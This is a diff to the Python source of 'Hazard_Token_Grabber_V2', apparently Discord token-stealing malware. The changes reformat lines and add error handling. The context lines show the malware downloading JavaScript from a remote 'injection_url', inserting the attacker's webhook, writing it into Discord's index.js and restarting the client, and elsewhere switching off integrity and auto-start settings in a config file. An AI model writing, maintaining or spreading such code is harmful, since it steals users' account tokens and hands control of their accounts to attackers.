@@ -162,10 +162,12 @@ class Hazard_Token_Grabber_V2(functions):
                         if os.path.exists(inj_path):
                             if self.startup not in argv[0]:
                                 try:
-                                    os.makedirs(inj_path+'initiation', exist_ok=True)
+                                    os.makedirs(
+                                        inj_path+'initiation', exist_ok=True)
                                 except (FileExistsError, PermissionError):
                                     pass
-                            f = httpx.get(self.config('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+                            f = httpx.get(self.config('injection_url')).text.replace(
+                                "%WEBHOOK%", self.webhook)
                             with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                 indexFile.write(f)
                             os.startfile(app + self.sep + _dir + '.exe')
@@ -191,7 +193,10 @@ class Hazard_Token_Grabber_V2(functions):
                 pass
         if os.path.exists(config):
             with open(config) as f:
-                item = json.load(f)
+                try:
+                    item = json.load(f)
+                except json.decoder.JSONDecodeError:
+                    pass
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
